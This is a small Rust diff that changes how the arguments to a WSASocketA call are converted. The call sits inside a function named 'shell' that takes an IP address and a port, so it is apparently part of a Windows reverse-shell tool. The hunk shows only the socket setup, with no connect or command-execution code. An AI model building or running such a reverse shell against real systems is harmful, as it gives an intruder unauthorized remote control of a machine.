@@ -31,8 +31,8 @@ pub fn shell(ip: &str, port: u16) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSASocketA.html
     let socket = unsafe {
         WSASocketA(
-            AF_INET.0 as i32,
-            SOCK_STREAM as i32,
+            AF_INET.0.into(),
+            SOCK_STREAM.0,
             IPPROTO_TCP.0,
             None,
             0,
